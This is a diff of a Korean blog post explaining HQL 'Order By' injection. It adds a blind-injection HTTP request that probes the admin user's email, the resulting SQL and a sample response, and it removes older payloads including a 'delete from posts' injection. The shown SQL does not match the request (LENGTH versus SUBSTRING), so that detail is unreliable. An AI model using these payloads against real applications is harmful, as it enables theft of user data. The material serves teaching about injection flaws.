@@ -21,13 +21,27 @@ tags:
 **핵심: Order By Injection**
 정렬 파라미터에 악의적인 값을 넣으면 임의의 HQL 구문을 실행할 수 있다는 것.
 
-정상적인 요청
+아래와 같이 악의적인 요청을 보냈을 때:
 ```
-GET /posts?sortBy=title
+GET :8000/products?orderBy=name+INTERSECT+SELECT+t+FROM+Test+t+WHERE+(SELECT+SUBSTRING(email,1,1)+FROM+users+WHERE+username='admin')='a'+ORDER+BY+t.id
 ```
 
-악의적인 요청
+다음과 같은 네이티브 쿼리로 수행된다.
+```sql
+(SELECT * FROM test_table t1 ORDER BY t1.name)
+INTERSECT
+(SELECT * FROM test_table t 
+ WHERE (SELECT LENGTH(email) FROM users WHERE username='admin')=17);
 ```
-GET /posts?sortBy=title;delete from posts
-GET /posts?sortBy=(select password from users)
+
+해당 쿼리의 수행 결과로 데이터가 존재 했을 경우 조건이 참이라는 뜻으로 원래는 데이터를 유추하는게 가능하다는 얘기이다.  
 ```
+HTTP/1.1 200
+Content-Type: application/json
+Date: Fri, 01 Aug 2025 13:34:57 GMT
+Content-Length: 27
+
+
+[{"id":1,"name":"test123"}]
+```
+
